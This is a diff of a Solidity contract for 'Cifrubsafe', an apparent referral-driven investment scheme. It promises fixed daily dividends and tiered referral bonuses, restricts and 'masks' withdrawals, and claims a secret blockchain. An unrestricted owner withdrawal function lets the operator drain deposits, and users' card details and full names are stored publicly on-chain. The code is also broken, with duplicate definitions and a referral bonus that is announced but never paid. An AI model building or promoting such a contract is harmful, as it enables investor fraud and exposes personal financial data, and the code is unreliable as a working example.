@@ -2,52 +2,46 @@
 pragma solidity ^0.8.0;
 
 /*
- * Project: Cifrobsafe (Цифрубсейф)
- *
- * This contract implements the core logic for a blockchain-based financial ecosystem
- * based on Ethereum (with digital rubles as the internal currency, 1:1 with the ruble).
- *
- * Main functionalities:
- * 1. Fund user available balance by sending ETH.
- * 2. Purchase "cells" (15 types) using the available balance.
- *    - Each cell type has a fixed nominal value in digital rubles (CFRUB).
- *    - A cell is considered "filled" when the full required amount is paid.
- * 3. Accrue daily dividends:
- *    - Base rate: 0.05% per day on each filled cell.
- *    - Additional bonus: 0.08% per day for each active first-level referral
- *      (i.e., a referral that has filled at least one cell).
- *    - Dividends are calculated daily (e.g., at 17:00 MSK when claimDividends is called).
- *    - Accrued dividends are stored in dividendBalance.
- * 4. Status system with monthly bonus:
- *    - Depending on the number of active referrals (first-level), the user receives an additional bonus percentage (converted to a daily rate by dividing by 30).
- * 5. Every 3 months, the user can transfer all dividends from dividendBalance to withdrawableBalance.
- * 6. Withdrawals (of digital rubles) are allowed only on Tuesday and Thursday between 15:00 and 21:00 MSK.
- *    - Withdrawals are masked by splitting the payment into 3 parts.
- * 7. Fiat operations:
- *    - Users can submit deposit/withdrawal requests via ruble cards.
- *    - Processing functions (onlyOwner) update withdrawableBalance accordingly.
- * 8. Funds transfer:
- *    - Users can transfer funds from withdrawableBalance to availableBalance.
- * 9. User profile:
- *    - Stores user's card info, TRC-20 wallet, full name, and verification status.
- * 10. Stub functions for additional features:
- *     - Currency conversion (digital rubles to any currency without fees).
- *     - Offline payments (payments without internet).
- *     - "CFRUB Market": a marketplace for buying and selling digital rubles.
- *
- * Note: The strategic reserve is held at a specific address (strategicReserve) and managed off-chain.
+ * Project: Cifrubsafe
+ * 
+ * Overview:
+ * This contract implements the core functionality of the Cifrubsafe project.
+ * 
+ * System Description:
+ * - Conventional ruble funds are automatically converted to digital rubles (CFRUB) on the basis
+ *   of the Ethereum blockchain. However, the project is developed on a secret blockchain infrastructure
+ *   that is not publicly disclosed.
+ * - Funds are stored in "cells" that hold money in a special token (CFRUB) which is pegged 1:1 to the ruble.
+ * - The CFRUB token is tied to Ether (using a scaling factor similar to ether, where 1 CFRUB = 1e18 units).
+ * - When users withdraw funds, Ether is drawn from the strategic reserve, converted and masked
+ *   to ensure anonymity and security.
+ * 
+ * Main Features:
+ * 1. Funding: Users deposit ETH which is converted into digital rubles and credited to their "Available Balance".
+ * 2. Purchase Cells: There are 15 cell types (with fixed amounts in CFRUB). A cell is considered "filled" when the full required amount is paid.
+ * 3. Dividend Accrual: Daily dividends (0.05% per day per cell) are accrued plus an extra daily bonus of 0.08% per active first-level referral.
+ * 4. Status System: Users receive monthly bonus percentages based on the number of active first-level referrals.
+ * 5. Dividend Transfer: Every 3 months, accrued dividends (Dividend Balance) can be transferred to the Withdrawable Balance.
+ * 6. Withdrawals: Funds can be withdrawn (digital rubles) only on Tuesday and Thursday between 15:00 and 21:00 MSK, using a masked payment mechanism.
+ * 7. Fiat Operations: Users can submit requests for fiat deposits/withdrawals via ruble cards.
+ * 8. Balance Transfer: Users can transfer funds from the Withdrawable Balance to the Available Balance.
+ * 9. User Profile: Stores user details (card info, TRC-20 wallet, full name, verification status).
+ * 10. Additional Stubs: 
+ *      - Currency conversion (automatic conversion of CFRUB to any currency without fees).
+ *      - Offline payments (ability to pay/transfer funds without internet).
+ *      - CFRUB Market (a marketplace for users to buy and sell digital rubles).
+ * 
+ * Note:
+ * The strategic reserve is held at a designated address and managed off-chain.
  */
 
-// Define the unit of digital rubles (CFRUB) similarly to ether (1 CFRUB = 1e18 units)
 uint256 constant CFRUB = 1e18;
 
-contract Cifrobsafe {
+contract Cifrubsafe {
     address public owner;
-    
-    // Strategic reserve address (used off-chain)
     address public constant strategicReserve = 0x2fb074fa59c9294c71246825c1c9a0c7782d41a4;
     
-    // 15 cell types with fixed nominal values (digital rubles)
+    // 15 cell types with fixed nominal values (in digital rubles, 1:1 to ruble)
     uint256[15] public cellNominals = [
         7800 * CFRUB,
         10600 * CFRUB,
@@ -74,32 +68,32 @@ contract Cifrobsafe {
     // Status system structure (for reference)
     struct Status {
         uint256 minActiveReferrals;
-        uint256 bonusBP; // monthly bonus in basis points (e.g., 50 bp = 0.5% per month)
+        uint256 bonusBP; // Monthly bonus in basis points (e.g., 50 bp = 0.5% per month)
     }
     Status[] public statuses;
     
-    // Structure for a cell (investment unit)
+    // Cell structure
     struct Cell {
-        uint8 cellType;           // Type of cell (1-15)
-        uint256 amount;           // Amount deposited (must equal the cell nominal)
-        uint256 depositTime;      // Timestamp when deposited
-        uint256 lastDividendTime; // Last dividend calculation timestamp
+        uint8 cellType;
+        uint256 amount;
+        uint256 depositTime;
+        uint256 lastDividendTime;
     }
+    mapping(address => Cell[]) public userCells;
     
-    // User profile data
+    // User profile structure
     struct UserProfile {
-        string cardInfo;       // Card details for fiat withdrawals
-        string trc20Wallet;    // TRC-20 wallet address for digital ruble withdrawals
-        string fullName;       // User's full name
-        bool verified;         // Verification status
+        string cardInfo;
+        string trc20Wallet;
+        string fullName;
+        bool verified;
     }
     mapping(address => UserProfile) public userProfiles;
     
-    // User balances
-    mapping(address => uint256) public availableBalance;    // Funds available for purchasing cells
-    mapping(address => uint256) public withdrawableBalance;   // Funds available for withdrawal
-    mapping(address => uint256) public dividendBalance;       // Accrued dividends
-    // Total balance is computed as: availableBalance + withdrawableBalance + dividendBalance + sum of cell deposits.
+    // User balances:
+    // availableBalance: funds available for purchasing cells.
+    // withdrawableBalance: funds available for withdrawal (to crypto wallet, bank card, etc.).
+    // dividendBalance: accrued dividends.
     function totalCellBalance(address user) public view returns (uint256 sum) {
         Cell[] memory cells = userCells[user];
         for (uint256 i = 0; i < cells.length; i++) {
@@ -110,25 +104,24 @@ contract Cifrobsafe {
         return availableBalance[user] + withdrawableBalance[user] + dividendBalance[user] + totalCellBalance(user);
     }
     
-    // Mapping for cells per user
-    mapping(address => Cell[]) public userCells;
-    // Active first-level referrals (users who purchased at least one cell)
-    mapping(address => address[]) public activeReferrals;
+    mapping(address => uint256) public availableBalance;
+    mapping(address => uint256) public withdrawableBalance;
+    mapping(address => uint256) public dividendBalance;
     
-    // Last monthly transfer timestamp for dividend transfers (every 3 months)
+    mapping(address => address[]) public activeReferrals;
     mapping(address => uint256) public lastMonthlyTransfer;
     
-    // Fiat requests structure
+    // Fiat operations: requests for deposits/withdrawals via ruble cards.
     struct FiatRequest {
-        uint256 amount;       // Amount in rubles
-        string cardInfo;      // Card details
-        uint256 requestTime;  // Request timestamp
-        bool processed;       // Request processed flag
+        uint256 amount;
+        string cardInfo;
+        uint256 requestTime;
+        bool processed;
     }
     mapping(address => FiatRequest[]) public fiatDepositRequests;
     mapping(address => FiatRequest[]) public fiatWithdrawalRequests;
     
-    // Events for logging
+    // Events
     event FundsDeposited(address indexed user, uint256 amount);
     event CellPurchased(address indexed user, uint8 cellType, uint256 amount);
     event ReferralBonusPaid(address indexed referrer, address indexed referral, uint256 amount, uint8 level);
@@ -147,43 +140,38 @@ contract Cifrobsafe {
     event BuyOrderPlaced(address indexed buyer, uint256 amount, uint256 pricePerUnit);
     
     modifier onlyOwner() {
-        require(msg.sender == owner, "Only owner can call");
+        require(msg.sender == owner, "Only owner");
         _;
     }
     
     constructor() {
         owner = msg.sender;
         // Initialize status system
-        statuses.push(Status(3, 50));    // Digital User: ≥3 referrals, bonus 0.5%/month (50 bp)
-        statuses.push(Status(9, 90));    // Digital Broker: ≥9, bonus 0.9%/month (90 bp)
-        statuses.push(Status(15, 130));  // Digital Expert: ≥15, bonus 1.3%/month (130 bp)
-        statuses.push(Status(20, 180));  // Digital Professional: ≥20, bonus 1.8%/month (180 bp)
-        statuses.push(Status(30, 230));  // Digital Master: ≥30, bonus 2.3%/month (230 bp)
-        statuses.push(Status(38, 280));  // Digital Leader: ≥38, bonus 2.8%/month (280 bp)
-        statuses.push(Status(45, 330));  // Bronze Digital Leader: ≥45, bonus 3.3%/month (330 bp)
-        statuses.push(Status(75, 400));  // Silver Digital Leader: ≥75, bonus 4%/month (400 bp)
-        statuses.push(Status(100, 450)); // Gold Digital Leader: ≥100, bonus 4.5%/month (450 bp)
-        statuses.push(Status(120, 530)); // Digital Auctioneer: ≥120, bonus 5.3%/month (530 bp)
+        statuses.push(Status(3, 50));
+        statuses.push(Status(9, 90));
+        statuses.push(Status(15, 130));
+        statuses.push(Status(20, 180));
+        statuses.push(Status(30, 230));
+        statuses.push(Status(38, 280));
+        statuses.push(Status(45, 330));
+        statuses.push(Status(75, 400));
+        statuses.push(Status(100, 450));
+        statuses.push(Status(120, 530));
     }
     
-    // =====================================================
-    // 1. Funding: Deposit funds into Available Balance
-    // =====================================================
+    // 1. Deposit funds into Available Balance.
     function depositFunds() external payable {
         require(msg.value > 0, "Must send some ether");
         availableBalance[msg.sender] += msg.value;
         emit FundsDeposited(msg.sender, msg.value);
     }
     
-    // =====================================================
-    // 2. Purchase Cells using Available Balance
-    // =====================================================
+    // 2. Purchase a cell using Available Balance.
     function purchaseCell(uint8 cellType, address referrer) external {
         require(cellType >= 1 && cellType <= 15, "Invalid cell type");
         uint256 requiredAmount = cellNominals[cellType - 1];
         require(availableBalance[msg.sender] >= requiredAmount, "Insufficient available balance");
         availableBalance[msg.sender] -= requiredAmount;
-        
         Cell memory newCell = Cell({
             cellType: cellType,
             amount: requiredAmount,
@@ -192,25 +180,20 @@ contract Cifrobsafe {
         });
         userCells[msg.sender].push(newCell);
         emit CellPurchased(msg.sender, cellType, requiredAmount);
-        
-        // First-level referral logic
         if (referrer != address(0) && referrer != msg.sender) {
             bool exists = false;
             for (uint256 i = 0; i < activeReferrals[referrer].length; i++) {
-                if (activeReferrals[referrer][i] == msg.sender) {
-                    exists = true;
-                    break;
-                }
+                if (activeReferrals[referrer][i] == msg.sender) { exists = true; break; }
             }
             if (!exists) {
                 activeReferrals[referrer].push(msg.sender);
-                uint256 bonusAmount = (requiredAmount * 10) / 100; // 10% instant bonus
+                uint256 bonusAmount = (requiredAmount * 10) / 100;
                 emit ReferralBonusPaid(referrer, msg.sender, bonusAmount, 1);
             }
         }
     }
     
-    // Function to transfer funds from Withdrawable Balance to Available Balance
+    // 2.1 Transfer funds from Withdrawable Balance to Available Balance.
     function transferToAvailableBalance(uint256 amount) external {
         require(withdrawableBalance[msg.sender] >= amount, "Insufficient withdrawable balance");
         withdrawableBalance[msg.sender] -= amount;
@@ -218,17 +201,12 @@ contract Cifrobsafe {
         emit TransferToAvailable(msg.sender, amount);
     }
     
-    // =====================================================
-    // 3. Daily Dividend Accrual (calculated at 17:00 MSK)
-    // =====================================================
+    // 3. Dividend Accrual.
     function totalCellBalance(address user) public view returns (uint256 sum) {
         Cell[] memory cells = userCells[user];
-        for (uint256 i = 0; i < cells.length; i++) {
-            sum += cells[i].amount;
-        }
+        for (uint256 i = 0; i < cells.length; i++) { sum += cells[i].amount; }
     }
     
-    // Compute daily dividends: 0.05% per day per cell + 0.08% per day bonus for each active referral
     function computeDailyDividends(address user) public view returns (uint256 totalDividends) {
         Cell[] memory cells = userCells[user];
         uint256 daysPassed;
@@ -250,13 +228,11 @@ contract Cifrobsafe {
         minDays = type(uint256).max;
         for (uint256 i = 0; i < cells.length; i++) {
             uint256 daysPassed = (block.timestamp - cells[i].lastDividendTime) / 1 days;
-            if (daysPassed < minDays) {
-                minDays = daysPassed;
-            }
+            if (daysPassed < minDays) { minDays = daysPassed; }
         }
     }
     
-    // User calls claimDividends to credit accrued dividends to Dividend Balance.
+    // Users call this function to claim dividends, which are added to dividendBalance.
     function claimDividends() external {
         uint256 dividends = computeDailyDividends(msg.sender);
         require(dividends > 0, "No dividends accrued");
@@ -267,9 +243,7 @@ contract Cifrobsafe {
         emit DividendAccrued(msg.sender, dividends);
     }
     
-    // =====================================================
-    // 4. Monthly Transfer: Move Dividends to Withdrawable Balance (every 3 months)
-    // =====================================================
+    // 4. Monthly Transfer: Every 3 months, transfer dividendBalance to withdrawableBalance.
     function monthlyTransfer() external {
         require(block.timestamp >= lastMonthlyTransfer[msg.sender] + 90 days, "Transfer not available yet");
         uint256 amount = dividendBalance[msg.sender];
@@ -280,11 +254,8 @@ contract Cifrobsafe {
         emit MonthlyTransfer(msg.sender, amount);
     }
     
-    // =====================================================
-    // 5. Withdraw Funds (Digital Rubles)
-    // Withdrawals allowed only on Tue/Thu from 15:00 to 21:00 MSK.
-    // Uses masked transfer (splitting amount into 3 parts).
-    // =====================================================
+    // 5. Withdraw funds (digital rubles).
+    // Withdrawals are allowed only on Tue/Thu between 15:00 and 21:00 MSK.
     function withdraw() external {
         require(_isWithdrawalWindow(), "Withdrawals allowed only on Tue/Thu between 15:00 and 21:00 MSK");
         uint256 amount = withdrawableBalance[msg.sender];
@@ -313,9 +284,7 @@ contract Cifrobsafe {
         require(success3, "Transfer part 3 failed");
     }
     
-    // =====================================================
-    // 6. Fiat Operations (Deposit & Withdrawal via Ruble Cards)
-    // =====================================================
+    // 6. Fiat Operations.
     function fiatDepositRequest(uint256 amount, string calldata cardInfo) external {
         fiatDepositRequests[msg.sender].push(FiatRequest({
             amount: amount,
@@ -330,7 +299,7 @@ contract Cifrobsafe {
         require(requestIndex < fiatDepositRequests[user].length, "Invalid request index");
         FiatRequest storage req = fiatDepositRequests[user][requestIndex];
         require(!req.processed, "Request already processed");
-        withdrawableBalance[user] += req.amount * 1 ether; // 1:1 conversion assumed
+        withdrawableBalance[user] += req.amount * 1 ether;
         req.processed = true;
         emit FiatDepositProcessed(user, req.amount, req.requestTime);
     }
@@ -356,9 +325,7 @@ contract Cifrobsafe {
         emit FiatWithdrawalProcessed(user, req.amount, req.requestTime);
     }
     
-    // =====================================================
-    // 7. User Profile: Update personal data (card, TRC-20 wallet, full name, verification)
-    // =====================================================
+    // 7. Update User Profile.
     function updateProfile(string calldata cardInfo, string calldata trc20Wallet, string calldata fullName, bool verified) external {
         userProfiles[msg.sender] = UserProfile({
             cardInfo: cardInfo,
@@ -369,45 +336,33 @@ contract Cifrobsafe {
         emit ProfileUpdated(msg.sender, cardInfo, trc20Wallet, fullName, verified);
     }
     
-    // =====================================================
-    // 8. Stub Functions for Currency Conversion and Offline Payments
-    // =====================================================
+    // 8. Stub Functions for Currency Conversion and Offline Payments.
     function convertToCurrency(string calldata currencyCode, uint256 amount) external view returns (uint256 convertedAmount) {
-        // Stub: In a real system, integrate with a conversion service without fees.
         convertedAmount = amount;
         emit CurrencyConversion(msg.sender, currencyCode, amount, convertedAmount);
     }
     
     function offlinePayment(address recipient, uint256 amount) external {
-        // Stub: Represents an offline payment mechanism.
         emit OfflinePayment(msg.sender, recipient, amount);
     }
     
-    // =====================================================
-    // 9. CFRUB Market: Stub functions for a marketplace to trade digital rubles
-    // =====================================================
+    // 9. CFRUB Market Stub Functions.
     function placeSellOrder(uint256 amount, uint256 pricePerUnit) external {
-        // Stub: In a real implementation, the order would be stored and processed off-chain.
         emit SellOrderPlaced(msg.sender, amount, pricePerUnit);
     }
     
     function placeBuyOrder(uint256 amount, uint256 pricePerUnit) external {
-        // Stub: In a real implementation, the order would be stored and processed off-chain.
         emit BuyOrderPlaced(msg.sender, amount, pricePerUnit);
     }
     
-    // =====================================================
-    // 10. Owner Withdrawal: For project development
-    // =====================================================
+    // 10. Owner Withdrawal (for project development).
     function ownerWithdraw(uint256 amount) external onlyOwner {
         require(address(this).balance >= amount, "Insufficient contract balance");
         payable(owner).transfer(amount);
     }
     
-    // Fallback: Receive ETH
     receive() external payable {}
     
-    // Fiat request structure defined at the bottom
     struct FiatRequest {
         uint256 amount;
         string cardInfo;
